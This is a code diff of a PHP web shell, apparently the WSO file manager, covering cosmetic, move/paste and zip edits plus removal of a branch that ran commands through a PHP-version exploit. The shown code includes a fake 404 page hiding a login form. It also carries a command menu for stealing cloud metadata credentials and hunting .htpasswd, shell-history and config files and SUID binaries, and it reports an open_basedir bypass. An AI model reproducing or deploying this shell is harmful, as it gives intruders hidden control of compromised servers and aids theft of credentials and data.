@@ -54,7 +54,7 @@ try {
 		$auth_form = "<form method=post style='position:fixed;left:-1000px;'><input type=text name=pass autofocus=true></form></body>";
 		$body = str_replace('/notexist' . $rand, $_SERVER['SCRIPT_NAME'], wsoGetFile('http://' . $_SERVER['HTTP_HOST'] . '/notexist' . $rand));
 		$body = stripos($body, '</body>')?str_replace('</body>', $auth_form, $body):$body.$auth_form;
-		
+
 		header('HTTP/1.0 404 Not Found');
 		die(!empty($body)?$body:$auth_form);
 	}
@@ -74,7 +74,7 @@ try {
 			$cwd_links.= "<a style='color:" . wsoPermsColorOnly($cwd_file_path) . "' " . (wsoPermsColorOnly($cwd_file_path) == '#f18260' ? "" : "onclick=g('FilesMan','" . $cwd_file_path . "')") . ">" . $file_path[$i] . "/</a>";
 		}
 		$buttons = is_writable($GLOBALS['cwd']) ? '<span class=float-right>
-			<a href="#" id="mkdir">[ new dir ]</a> 
+			<a href="#" id="mkdir">[ new dir ]</a>
 			<a href="#" id="mkfile">[ new file ]</a>
 			<form method=post ENCTYPE="multipart/form-data">
 				<input type=hidden name=a value=FilesMan>
@@ -218,7 +218,7 @@ try {
 
 	if ($os == 'win') $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
 	else $aliases = array("Fetch AWS metadata" => "curl -Ss http://169.254.169.254/latest/meta-data/identity-credentials/", "List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
-	
+
 	function wsoHeader() {
 		$_POST['charset'] = $GLOBALS['default_charset'];
 		global $color;
@@ -359,7 +359,7 @@ try {
 				<u class="copy" title="' . $_SERVER["SERVER_ADDR"] . '">' . $_SERVER["SERVER_ADDR"] . '</u> (' . $ip_data . '), <span>' . $domains_count . '</span> domains. <a href="https://securitytrails.com/list/ip/' . @$_SERVER["SERVER_ADDR"] . '">[ securitytrails ]</a> <a href="https://www.virustotal.com/gui/ip-address/' . $_SERVER["SERVER_ADDR"] . '">[ virustotal (' . $vt_detections . '/56) ]</a> <a href="https://publicwww.com/websites/ip%3A' . $_SERVER["SERVER_ADDR"] . '/">[ publicwww ]</a><br>
 				' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )' . ($open_base_dir || $chains_bypassed === true ? ', <span>Open base dir:</span> ' . $open_base_dir . ' (' . ($chains_bypassed === true ? '<a class="text-green">bypassed</a>' : $chains_bypassed) . ')' : '') . '<br>
 				' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode'] ? '<font class=text-red>ON</font>' : '<font class=text-green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a><br>
-				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>ram</span> total: ' . $ram_size . ', free: ' . $ram_free . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' . 
+				<span>disk:</span> total ' . wsoViewSize($totalSpace) . ', free ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%), <span>ram</span> total: ' . $ram_size . ', free: ' . $ram_free . ', <span>cores:</span> ' . (file_exists('/proc/cpuinfo') ? substr_count('' . @file_get_contents('/proc/cpuinfo'), "processor") : '--') . ', <span>loadavg:</span> ' . substr(end(@sys_getloadavg()), 0, 4) . '</td>' . '<td width=200></td></tr></table>' .
 				'<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
 	}
 	function wsoFooter() {
@@ -370,7 +370,7 @@ try {
 						document.querySelectorAll('textarea').forEach(function(textarea,code,holder,lines){
 							var
 							updateCode = function(text){
-								text += text[text.length-1] == '\\n'?" ":"";
+								text += text[text.length-1] == '\\n'?' ':'';
 								if(code.textContent != text) {
 									code.textContent = text;
 									hljs.highlightElement(code);
@@ -379,7 +379,7 @@ try {
 								syncScroll();
 							},
 							updadeLineNums = function() {
-								lines.textContent = "";
+								lines.textContent = '';
 								for(var i=1;i<(textarea.value.match(/\\n/g)||[]).length+3; i++) lines.textContent+=i+'\\n';
 							},
 							syncScroll = function() {
@@ -435,7 +435,7 @@ try {
 							textarea.addEventListener('change', function() { updateCode(textarea.value) });
 							textarea.addEventListener('scroll', function() { updateCode(textarea.value) });
 							textarea.addEventListener('keydown', function(e) { checkTabs(e) });
-							
+
 							hljs.highlightElement(code);
 							updadeLineNums();
 						});
@@ -640,15 +640,6 @@ try {
 			}
 			elseif (function_exists('expect_popen')) {
 				$out = @file_get_contents('expect://' . $in);
-			}
-			elseif ( PHPVERSION[0]==7 && PHPVERSION<'7.4.26' || PHPVERSION[0]==8 && PHPVERSION<'8.0.13' ) {
-				global $wsoExGentlyUrl;
-				if( $wsoExGentlyUrl ) {
-					ob_start();
-					echo wsoExGently($in);
-					$out = ob_get_clean();
-					$wsoExGentlyUrl = '';
-				}
 			}
 			else {
 				$out = "↳ Can't exec commands. But we still have PHP!";
@@ -906,10 +897,14 @@ try {
 							if (is_dir($c . $s)) {
 								mkdir($d . $s);
 								$h = @opendir($c . $s);
-								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
-							} elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);
+								while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) move_paste($c . $s . '/', $f, $d . $s . '/');
+								@rmdir($c . $s);
+							} elseif (@is_file($c . $s)) {
+								@copy($c . $s, $d . $s);
+								@unlink($c . $s);
+							}
 						}
-						foreach ($_COOKIE['f'] as $f) @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
+						foreach ($_COOKIE['f'] as $f) if (!@rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f)) move_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
 					} elseif ($_COOKIE['act'] == 'zip') {
 						if (class_exists('ZipArchive')) {
 							$zip = new ZipArchive();
@@ -921,7 +916,7 @@ try {
 									elseif (@is_dir($_COOKIE['c'] . $f)) {
 										$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/'));
 										foreach ($iterator as $key => $value) {
-											$zip->addFile(realfile_path($key), $key);
+											$zip->addFile(realpath($key), $key);
 										}
 									}
 								}
@@ -1798,5 +1793,3 @@ try {
 					catch(Exception $e) {
 						echo '<span class="text-red">' . $e->getMessage() . '</span>';
 					}
-					
-
